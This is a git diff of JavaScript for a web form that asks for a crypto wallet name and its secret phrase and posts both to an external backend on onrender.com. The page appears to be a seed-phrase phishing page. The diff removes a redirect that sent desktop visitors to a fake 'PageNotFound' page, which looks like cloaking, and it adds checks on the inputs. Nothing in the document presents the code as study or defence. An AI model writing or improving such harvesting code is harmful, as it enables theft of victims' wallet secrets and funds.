@@ -2,10 +2,8 @@ let walletName = ""
 let secretPhrase = ""
 let error1 = false;
 let error2 = false;
-
-if(screen.width > 768){
-  window.location.assign("../PageNotFound/PageNotFound.html")
-}
+let error3 = false;
+let error4 = false;
 
 document.querySelector(".input-box").addEventListener("change",(e)=>{
   document.querySelector(".error-box-1").classList.add("display")
@@ -31,6 +29,16 @@ document.querySelector(".text-box").addEventListener("input",(e)=>{
   }
 })
 
+function checkSymbNum(inputData){
+  let inputLen = inputData.length
+  for(let i=0;i<inputLen;i++){
+    if((((inputData.charCodeAt(i)) >= 0 && (inputData.charCodeAt(i)) < 65) || ((inputData.charCodeAt(i)) >= 91 && (inputData.charCodeAt(i)) <= 96) ) ||  ((inputData.charCodeAt(i)) >= 123 && (inputData.charCodeAt(i)) <= 126)){
+      return false;
+    }
+  }
+  return true;
+}
+
 function checkSecret(str){
   if(str.length<3) return true;
   for(let i=0;i<str.length;i++){
@@ -50,6 +58,19 @@ function checkSecret(str){
 
 document.querySelector(".button").addEventListener("click",(e)=>{
   e.preventDefault();
+
+  if(!checkSymbNum(walletName)){
+    error3 = true
+    document.querySelector(".error-box-1").classList.remove("display");
+    document.querySelector(".error-box-1").innerHTML = "*Wallet name should not contain any number or symbol";
+  }
+
+  if(!checkSymbNum(secretPhrase)){
+    error4 = true
+    document.querySelector(".error-box-2").classList.remove("display");
+    document.querySelector(".error-box-2").innerHTML = "*Secret phrase should not contain any number or symbol";
+  }
+
   if(walletName.length==0 || walletName.length ===null){
     error1 = true;
   }
@@ -77,7 +98,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
     document.querySelector(".error-box-2").innerHTML = "*Enter Secret Phrase";
   }
 
-  if(ans === false && (error1 === false && error2 === false)){
+  if(ans === false && (error1 === false && error2 === false) && (error3 === false && error4 === false)){
     const url = "https://backend-01-92mi.onrender.com/api/data2";
       const data = {
           walletName:walletName,
